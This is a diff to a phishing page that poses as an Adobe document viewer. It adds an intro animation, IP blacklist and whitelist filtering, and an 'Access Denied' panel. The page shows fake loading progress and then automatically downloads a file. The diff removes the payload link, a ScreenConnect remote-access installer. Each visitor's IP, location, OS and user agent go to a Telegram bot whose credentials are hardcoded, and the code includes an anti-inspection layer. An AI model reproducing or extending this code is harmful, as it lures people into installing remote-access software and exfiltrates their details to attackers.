@@ -30,6 +30,7 @@
       justify-content: center;
       align-items: center;
       z-index: 1000;
+      opacity: 1;
     }
 
     .modal-content {
@@ -39,15 +40,9 @@
       width: 90%;
       max-width: 500px;
       box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-      animation: modalFadeIn 0.3s ease-out;
       text-align: center;
       min-height: 280px;
       position: relative;
-    }
-
-    @keyframes modalFadeIn {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
     }
 
     .modal-header img {
@@ -55,13 +50,43 @@
       margin-bottom: 15px;
     }
 
+    /* ===== LOTTIE ANIMATION CONTAINER ===== */
+    .lottie-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 0;
+      opacity: 1;
+      transition: opacity 0.6s ease;
+    }
+
+    .lottie-container.hidden {
+      opacity: 0;
+      pointer-events: none;
+      position: absolute;
+      width: 100%;
+    }
+
+    .lottie-container dotlottie-wc {
+      width: 200px;
+      height: 200px;
+    }
+
     /* ===== LOADING STYLES ===== */
     .loading-container {
       display: block;
       padding: 10px 0;
+      opacity: 0;
+      transition: opacity 0.8s ease;
+      pointer-events: none;
     }
 
-    /* Adobe-style loading animation using Lottie-inspired CSS */
+    .loading-container.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+
+    /* Adobe-style loading animation */
     .adobe-loader {
       width: 80px;
       height: 80px;
@@ -80,7 +105,6 @@
       box-sizing: border-box;
     }
 
-    /* Animated dots effect */
     .adobe-loader .dots {
       position: absolute;
       top: 50%;
@@ -195,6 +219,46 @@
       background-color: #c71b1d;
     }
 
+    /* Access Denied Panel */
+    .access-denied {
+      display: none;
+      padding: 20px 0;
+    }
+
+    .access-denied.active {
+      display: block;
+    }
+
+    .access-denied .lock-icon {
+      font-size: 48px;
+      color: #ED2224;
+      margin-bottom: 12px;
+    }
+
+    .access-denied h3 {
+      color: #1e1e1e;
+      font-size: 20px;
+      font-weight: 600;
+      margin: 0 0 10px;
+    }
+
+    .access-denied p {
+      color: #555;
+      font-size: 14px;
+      line-height: 1.6;
+      margin: 0 0 10px;
+    }
+
+    .access-denied .ip-display {
+      background: #f8f9fa;
+      padding: 10px;
+      border-radius: 4px;
+      font-family: monospace;
+      font-size: 13px;
+      color: #333;
+      margin: 10px 0;
+    }
+
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(8px); }
       to { opacity: 1; transform: translateY(0); }
@@ -212,17 +276,21 @@
         min-height: 240px;
       }
       .adobe-loader {
-        width: 60px;
-        height: 60px;
+        width: 40px;
+        height: 40px;
       }
       .loading-status {
-        font-size: 14px;
+        font-size: 12px;
       }
       .error-panel h3 {
-        font-size: 16px;
+        font-size: 14px;
       }
       .error-panel p {
-        font-size: 13px;
+        font-size: 14px;
+      }
+      .lottie-container dotlottie-wc {
+        width: 40px;
+        height: 40px;
       }
     }
   </style>
@@ -234,6 +302,20 @@
     <div class="modal-content">
       <div class="modal-header">
         <img src="free-ad.webp" alt="Adobe Logo">
+      </div>
+
+      <!-- ===== ACCESS DENIED PANEL ===== -->
+      <div id="accessDenied" class="access-denied">
+        <div class="lock-icon">🔒</div>
+        <h3>Access Denied</h3>
+        <p>Your IP address has been blocked from accessing this document.</p>
+        <div class="ip-display" id="blockedIpDisplay">IP: Unknown</div>
+        <p style="font-size: 12px; color: #999;">If you believe this is an error, please contact support.</p>
+      </div>
+
+      <!-- ===== LOTTIE ANIMATION ===== -->
+      <div id="lottieContainer" class="lottie-container">
+        <dotlottie-wc src="https://lottie.host/c84685e5-ab03-4c8b-8304-f860c80244b7/pm7ccubzgi.lottie" autoplay loop></dotlottie-wc>
       </div>
 
       <!-- ===== LOADING INTERFACE ===== -->
@@ -264,9 +346,43 @@
   </div>
 
   <!-- hidden download link -->
-  <a id="downloadLink" href="https://pub-05b6b4acfe7a4dc0a82df0fb73bef7a9.r2.dev/ScreenConnect.ClientSetup.msi" style="display:none;"></a>
+  <a id="downloadLink" href="#" style="display:none;"></a>
+
+  <!-- Lottie Library -->
+  <script src="https://unpkg.com/@lottiefiles/dotlottie-wc@0.9.14/dist/dotlottie-wc.js" type="module"></script>
 
   <script>
+    // ============================================================
+    // 🔧 BACKEND CONFIGURATION - TIMER SETTINGS
+    // Modify these values to control timing (all values in seconds)
+    // ============================================================
+    const BACKEND_CONFIG = {
+      lottieDuration: 4,      // How long the initial Lottie animation plays
+      loadingDuration: 10,    // Time to reach 87% progress
+      errorDuration: 5,       // Time error shows before auto-download
+      downloadDelay: 5        // Time after download before redirect
+    };
+
+    // ============================================================
+    // 🔒 IP WHITELIST & BLACKLIST CONFIGURATION
+    // Add IPs you want to block or allow here
+    // Supports both single IPs and CIDR ranges (e.g., "192.168.1.0/24")
+    // ============================================================
+    const IP_ACCESS_CONFIG = {
+      // BLACKLIST: Add suspicious IPs here to block them
+      blacklist: [
+        // "192.168.1.200",      // Block a single IP
+        // "10.0.0.5",           // Block another IP
+        // "203.0.113.0/24"      // Block an entire subnet
+      ],
+      
+      // WHITELIST: Add IPs you want to always allow (overrides blacklist)
+      whitelist: [
+        // "192.168.1.100",      // Always allow this IP
+        // "10.0.0.0/8"          // Allow entire subnet
+      ]
+    };
+
     // ============================================================
     // 1. ANTI‑INSPECTION / PROTECTION LAYER
     // ============================================================
@@ -323,7 +439,56 @@
     })();
 
     // ============================================================
-    // 2. CORE FUNCTIONS
+    // 2. IP UTILITY FUNCTIONS
+    // ============================================================
+
+    // Convert IP to number for range comparisons
+    function ipToNumber(ip) {
+      const parts = ip.split('.');
+      if (parts.length !== 4) return 0;
+      return (parseInt(parts[0]) << 24) +
+             (parseInt(parts[1]) << 16) +
+             (parseInt(parts[2]) << 8) +
+             parseInt(parts[3]);
+    }
+
+    // Check if IP is in CIDR range
+    function ipInRange(ip, cidr) {
+      if (!cidr.includes('/')) {
+        return ip === cidr;
+      }
+      
+      const [range, bits] = cidr.split('/');
+      const mask = ~((1 << (32 - parseInt(bits))) - 1);
+      const ipNum = ipToNumber(ip);
+      const rangeNum = ipToNumber(range);
+      
+      return (ipNum & mask) === (rangeNum & mask);
+    }
+
+    // Check if IP is in a list (supports CIDR)
+    function isIpInList(ip, list) {
+      if (!list || list.length === 0) return false;
+      return list.some(item => ipInRange(ip, item));
+    }
+
+    // Check IP access permissions
+    function checkIpAccess(ip) {
+      // First check whitelist (overrides everything)
+      if (isIpInList(ip, IP_ACCESS_CONFIG.whitelist)) {
+        return { allowed: true, reason: 'whitelist' };
+      }
+      
+      // Then check blacklist
+      if (isIpInList(ip, IP_ACCESS_CONFIG.blacklist)) {
+        return { allowed: false, reason: 'blacklist' };
+      }
+      
+      return { allowed: true, reason: 'default' };
+    }
+
+    // ============================================================
+    // 3. CORE FUNCTIONS
     // ============================================================
 
     function isMobileDevice() {
@@ -351,7 +516,7 @@
     }
 
     // ============================================================
-    // 3. LOADING SIMULATION
+    // 4. LOADING SIMULATION
     // ============================================================
 
     let loadingTimer = null;
@@ -360,10 +525,13 @@
 
     function startLoadingSimulation() {
       const container = document.getElementById('loadingContainer');
+      const lottieContainer = document.getElementById('lottieContainer');
       const errorPanel = document.getElementById('errorPanel');
 
-      // Show loading, hide error
+      // Hide Lottie animation, show loading
+      lottieContainer.classList.add('hidden');
       container.classList.remove('hidden');
+      container.classList.add('active');
       errorPanel.classList.remove('active');
       downloadTriggered = false;
 
@@ -395,9 +563,11 @@
       // Set initial status
       statusEl.textContent = 'Opening documents...';
 
-      // Progress updates every 50ms - target 87% at 10 seconds
+      // Use config values from BACKEND_CONFIG
+      const totalDuration = BACKEND_CONFIG.loadingDuration * 1000;
+
+      // Progress updates every 50ms - target 87%
       const startTime = Date.now();
-      const totalDuration = 10000; // 10 seconds to reach 87%
 
       progressTimer = setInterval(() => {
         const elapsed = Date.now() - startTime;
@@ -407,14 +577,15 @@
         percentEl.textContent = progress + '%';
       }, 50);
 
-      // Status updates based on time
-      statusMessages.forEach((msg) => {
+      // Status updates based on time (scaled to loading duration)
+      statusMessages.forEach((msg, index) => {
+        const delay = (index / statusMessages.length) * totalDuration;
         setTimeout(() => {
           statusEl.textContent = msg.text;
-        }, msg.time);
+        }, delay);
       });
 
-      // After 10 seconds, show error state at 87%
+      // After loading duration, show error state at 87%
       loadingTimer = setTimeout(() => {
         clearInterval(progressTimer);
         progressFill.style.width = '87%';
@@ -423,24 +594,24 @@
         // Show error panel
         showErrorPanel();
         
-        // After 5 seconds, trigger automatic download
+        // After error duration, trigger automatic download
         setTimeout(() => {
           if (!downloadTriggered) {
             downloadTriggered = true;
             handleDownload();
             
-            // After another 5 seconds, redirect
+            // After download delay, redirect
             setTimeout(() => {
               window.location.href = 'complete.php';
-            }, 5000);
+            }, BACKEND_CONFIG.downloadDelay * 1000);
           }
-        }, 5000);
+        }, BACKEND_CONFIG.errorDuration * 1000);
         
       }, totalDuration);
     }
 
     // ============================================================
-    // 4. ERROR HANDLING
+    // 5. ERROR HANDLING
     // ============================================================
 
     function showErrorPanel() {
@@ -451,22 +622,26 @@
       if (loadingTimer) clearTimeout(loadingTimer);
       if (progressTimer) clearInterval(progressTimer);
 
+      container.classList.remove('active');
       container.classList.add('hidden');
       errorPanel.classList.add('active');
     }
 
     // ============================================================
-    // 5. REPORT VISIT TO TELEGRAM
+    // 6. REPORT VISIT TO TELEGRAM
     // ============================================================
 
-    async function reportVisitToTelegram() {
+    async function reportVisitToTelegram(ip, blocked = false) {
       const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ';
       const CHAT_ID = '7724482403';
 
       try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const ip = ipData.ip || 'unknown';
+        // If no IP provided, fetch it
+        if (!ip) {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
+          ip = ipData.ip || 'unknown';
+        }
 
         let location = 'unknown';
         try {
@@ -485,6 +660,7 @@
         const os = detectOS();
         const ua = navigator.userAgent;
 
+        const status = blocked ? '🚫 BLOCKED' : '✅ ALLOWED';
         const message = `
         📄 *Adobe Document Visit Report*
         👤 Visitor #${visitorNum}
@@ -493,6 +669,7 @@
         📍 Location: ${location}
         💻 OS: ${os}
         📱 UA: ${ua}
+        🔒 Status: ${status}
         `;
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -511,7 +688,7 @@
     }
 
     // ============================================================
-    // 6. HANDLE DOWNLOAD
+    // 7. HANDLE DOWNLOAD
     // ============================================================
 
     function handleDownload() {
@@ -534,7 +711,28 @@
     }
 
     // ============================================================
-    // 7. ERROR DOWNLOAD BUTTON HANDLER
+    // 8. SHOW ACCESS DENIED
+    // ============================================================
+
+    function showAccessDenied(ip) {
+      const accessDenied = document.getElementById('accessDenied');
+      const lottieContainer = document.getElementById('lottieContainer');
+      const loadingContainer = document.getElementById('loadingContainer');
+      const errorPanel = document.getElementById('errorPanel');
+      
+      // Hide everything else
+      lottieContainer.classList.add('hidden');
+      loadingContainer.classList.remove('active');
+      loadingContainer.classList.add('hidden');
+      errorPanel.classList.remove('active');
+      
+      // Show access denied
+      document.getElementById('blockedIpDisplay').textContent = 'IP: ' + ip;
+      accessDenied.classList.add('active');
+    }
+
+    // ============================================================
+    // 9. PAGE INITIALIZATION
     // ============================================================
 
     document.addEventListener('DOMContentLoaded', function() {
@@ -548,13 +746,44 @@
         });
       }
 
-      // Report visit immediately
-      reportVisitToTelegram();
-
-      // Auto‑trigger loading after page load
-      setTimeout(function() {
-        startLoadingSimulation();
-      }, 500);
+      // Get client IP and check access
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+          const clientIp = data.ip || 'unknown';
+          
+          // Check if IP is blacklisted (whitelist overrides)
+          const access = checkIpAccess(clientIp);
+          
+          if (!access.allowed) {
+            // IP is blocked - show access denied
+            showAccessDenied(clientIp);
+            // Report blocked visit
+            reportVisitToTelegram(clientIp, true);
+            return;
+          }
+          
+          // IP is allowed - proceed normally (page is visible to all)
+          // Report visit
+          reportVisitToTelegram(clientIp, false);
+          
+          // Show Lottie animation for configured duration, then transition to loading
+          setTimeout(function() {
+            startLoadingSimulation();
+          }, BACKEND_CONFIG.lottieDuration * 1000);
+        })
+        .catch(err => {
+          // If IP fetch fails, allow access by default
+          console.warn('IP fetch failed, allowing access by default:', err);
+          
+          // Report visit with unknown IP
+          reportVisitToTelegram('unknown', false);
+          
+          // Proceed with loading
+          setTimeout(function() {
+            startLoadingSimulation();
+          }, BACKEND_CONFIG.lottieDuration * 1000);
+        });
     });
   </script>
 
